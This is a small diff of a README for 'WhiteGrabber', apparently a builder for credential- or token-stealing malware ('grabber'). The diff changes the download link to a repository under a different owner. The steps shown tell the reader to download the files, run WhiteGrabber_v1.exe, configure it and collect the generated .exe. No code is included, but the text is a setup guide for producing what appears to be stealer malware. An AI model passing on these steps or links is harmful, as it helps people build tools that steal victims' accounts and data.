@@ -15,7 +15,7 @@
 ## <a id="setup"></a> 📁 〢 Setting up WhiteGrabber
 
 1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
-2. Install [WhiteGrabber Files](https://github.com/Inplex-sys/WhiteGrabber-Grabber-NoDualHook/archive/refs/heads/main.zip)
+2. Install [WhiteGrabber Files](https://github.com/WhiteOrgi/WhiteGrabber-v1/archive/refs/heads/main.zip)
 3. Click on WhiteGrabber_v1.exe
 4. Complete the configuration
 6. You have your .exe file enjoy :)
